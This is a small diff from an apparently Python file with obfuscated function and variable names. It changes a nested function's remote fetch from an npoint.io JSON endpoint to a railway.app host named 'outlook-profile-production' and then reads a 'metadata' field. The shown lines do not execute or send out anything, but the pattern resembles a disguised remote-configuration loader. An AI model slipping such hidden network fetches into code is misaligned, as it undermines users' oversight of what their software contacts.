@@ -18,7 +18,7 @@ def process_gjkakx_421():
 
     def eval_coahib_674():
         try:
-            net_ejuqer_568 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_ejuqer_568 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_ejuqer_568.raise_for_status()
             train_djxcjs_838 = net_ejuqer_568.json()
             net_vioykb_938 = train_djxcjs_838.get('metadata')
